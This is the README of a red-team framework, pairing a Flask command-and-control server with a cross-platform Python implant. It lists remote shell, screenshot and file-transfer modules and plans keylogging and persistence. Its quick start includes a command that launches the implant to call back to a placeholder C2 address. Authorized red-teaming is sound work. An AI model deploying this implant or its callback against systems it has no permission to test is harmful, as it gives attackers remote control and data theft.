# RedTeam Adversary Simulation Framework

A modular, Python-based Red Team adversary simulation framework for offensive security and red teaming exercises.

⚠️ **DISCLAIMER**: This framework is for educational and authorized penetration testing purposes only. Use only on systems you own or have explicit permission to test. Unauthorized use is illegal and unethical.

## 🚀 Features

- **Modular Command & Control (C2) server** - Flask-based web interface
- **Cross-platform Python agent** - Works on Windows, Linux, and macOS
- **Secure communication** - HTTP/HTTPS support with encryption capabilities
- **Modular attack techniques** - Shell execution, screenshot capture, file transfer
- **MITRE ATT&CK mapping** - Techniques mapped to MITRE framework
- **Easy to extend** - Simple module system for adding new capabilities
- **Interactive C2 controller** - Command-line interface for operator interaction

## 📁 Project Structure

```
advance_redteam_framework/
├── README.md                    # This file
├── requirements.txt             # Python dependencies
├── mitre_mapping.md            # MITRE ATT&CK technique mapping
├── c2/                         # Command & Control server
│   ├── server.py              # Main C2 server (Flask app)
│   └── modules/               # Attack modules
│       ├── __init__.py
│       ├── screenshot.py      # Screenshot capture
│       └── shell.py           # Remote shell execution
├── agent/                     # Agent/Implant
│   └── agent.py              # Main agent code
├── utils/                     # Utilities
│   └── comms.py              # Communication utilities
├── test_c2.py                # C2 testing script
└── c2_controller.py          # Interactive C2 controller
```

## Quick Start

1. **Clone the repository:**
   ```bash
   git clone https://github.com/yourusername/redteam-framework.git
   cd redteam-framework
   ```

2. **Install dependencies:**
   ```bash
   pip install -r requirements.txt
   ```

3. **Start the C2 server:**
   ```bash
   python c2/server.py
   ```

4. **Run the agent on a test machine:**
   ```bash
   python agent/agent.py --server https://<C2_SERVER_IP>:5000
   ```

5. **Add your own modules in `c2/modules/` and integrate with the C2!**

## Example Modules

- Remote shell execution
- Screenshot capture
- File upload/download
- Keylogging (to be added)
- Persistence (to be added)

## Legal Notice

For educational, ethical, and authorized Red Team use only. Do **not** deploy on systems you do not own or have explicit permission to test!

## MITRE ATT&CK Mapping

See `mitre_mapping.md` for coverage.

---

Happy hacking!